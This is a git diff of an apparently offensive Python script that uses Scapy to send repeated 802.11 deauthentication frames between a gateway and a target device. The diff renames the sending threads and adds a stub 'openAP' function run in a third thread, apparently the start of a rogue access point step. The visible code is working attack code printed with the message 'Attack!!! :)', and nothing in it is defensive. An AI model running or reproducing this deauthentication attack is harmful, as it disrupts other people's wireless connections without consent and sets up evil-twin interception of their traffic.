@@ -68,6 +68,10 @@ def for_client(frame, interface):
   while True:
     sendp(frame, iface = interface, count = 100, inter = 0.1)
 
+def openAP(net,targe_mac,interface):
+        
+        return 0
+
 if __name__ == "__main__":
 
     # 1. Get network interface card names & print
@@ -147,12 +151,17 @@ if __name__ == "__main__":
     print('Attack!!! :)')
     frame = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=1)
     frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=1)
-    st = threading.Thread(target = for_ap, args = (frame, interface))
-    lt = threading.Thread(target = for_client, args = (frame1, interface))
-    st.start()
-    lt.start()
-    st.join()
-    lt.join()
+    deauth1 = threading.Thread(target = for_ap, args = (frame, interface))
+    deauth2 = threading.Thread(target = for_client, args = (frame1, interface))
+    newAP = threading.Thread(target = openAP, args = (net, target_mac, interface))
+    deauth1.start()
+    deauth2.start()
+    newAP.start()
+    deauth1.join()
+    deauth2.join()
+    newAP.join()
+
+
 
     # 12. Disable monitor mode
     os.system(f'sudo ifconfig {interface} down')
